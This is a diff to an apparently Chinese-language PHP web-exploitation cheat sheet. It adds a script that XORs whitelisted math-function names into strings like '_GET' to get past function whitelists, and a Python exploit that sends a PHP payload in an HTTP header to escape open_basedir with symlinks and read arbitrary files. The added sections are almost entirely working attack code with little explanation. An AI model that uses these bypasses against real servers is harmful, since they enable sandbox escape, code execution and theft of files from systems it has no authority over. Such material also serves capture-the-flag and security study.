@@ -212,6 +212,24 @@ ret=reth+"^"+rett
 print ret
 ```
 
+白名单异或
+
+```php
+$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+$convert = ['decbin','decoct'];
+foreach($whitelist as $a){
+    foreach($convert as $b){
+        for($i=0;$i<999999;$i++){
+            $result = $a ^ $b($i);
+            if(preg_match('/_GET|_POST|_REQUEST/',$result)){
+                echo $a."^".$b."(".$i.")=".$result."\n";
+            }
+        }
+    }
+}
+```
+
+
 ### 取反
 
 ```php
@@ -568,6 +586,30 @@ chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ch
 
 分析：https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/
 
+
+symlink 法
+
+```python
+def exploit(f):
+    #print f
+    payload="""
+error_reporting(E_ALL);
+chdir("/var/www/html/sandbox/f700deb7a6e26f106e3103e6257bb68a75a1a5f3/");
+mkdir('./{0}/b/c/d/e/f/g/',0777,TRUE);
+symlink('./{0}/b/c/d/e/f/g','{1}');
+ini_set('open_basedir','/var/www/html/sandbox/f700deb7a6e26f106e3103e6257bb68a75a1a5f3:{2}/');
+symlink('{1}/../../../../../../','{2}');
+unlink('{1}');
+echo base64_encode(file_get_contents('{2}{3}'));
+""".format(randomstr(),randomstr(),randomstr(),f)
+    poc= payload.replace("\n",'')
+    #print poc
+    headers = {
+        "eki":poc
+    }
+    req=requests.get(url,headers=headers)
+    print req.text
+```
 
 ### 扩展资料
 
